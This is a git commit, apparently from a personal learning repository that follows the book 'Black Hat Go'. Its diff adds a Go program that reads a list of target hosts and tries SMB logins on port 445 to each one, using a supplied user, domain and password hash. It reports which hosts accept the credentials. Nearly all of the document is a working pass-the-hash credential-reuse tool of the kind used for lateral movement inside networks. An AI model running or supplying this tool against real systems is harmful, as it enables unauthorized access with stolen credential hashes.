f4f4d0735b201a2d84ab2818ab5aba72abd9ff0b
jimmydesu <jimsyyap@gmail.com>
2024-06-11 22:38:21 +1000

    passwd reuse

--- infosec_go/reuse_passwd/main.go
+++ infosec_go/reuse_passwd/main.go
@@ -3,12 +3,42 @@ package main
 import (
 	"bytes"
 	"fmt"
-	"github.com/blackhat-go/bhg/ch-6/smb/smb"
-	"io"
 	"log"
 	"os"
+
+	"github.com/blackhat-go/bhg/ch-6/smb/smb"
 )
 
 func main() {
+	if len(os.Args) != 5 {
+		log.Fatalln("Usage: main <target/hosts> <user> <domain> <hash>")
+	}
 
+	buf, err := os.ReadFile(os.Args[1])
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	options := smb.Options{
+		User:   os.Args[2],
+		Domain: os.Args[3],
+		Hash:   os.Args[4],
+		Port:   445,
+	}
+
+	targets := bytes.Split(buf, []byte{'\n'})
+	for _, target := range targets {
+		options.Host = string(target)
+
+		session, err := smb.NewSession(options, false)
+		if err != nil {
+			fmt.Printf("[-] Login failed [%s]: %s\n", options.Host, err)
+			continue
+		}
+		defer session.Close()
+		if session.IsAuthenticated {
+			fmt.Printf("[+] Login successful [%s]\n", options.Host)
+		}
+	}
 }
+
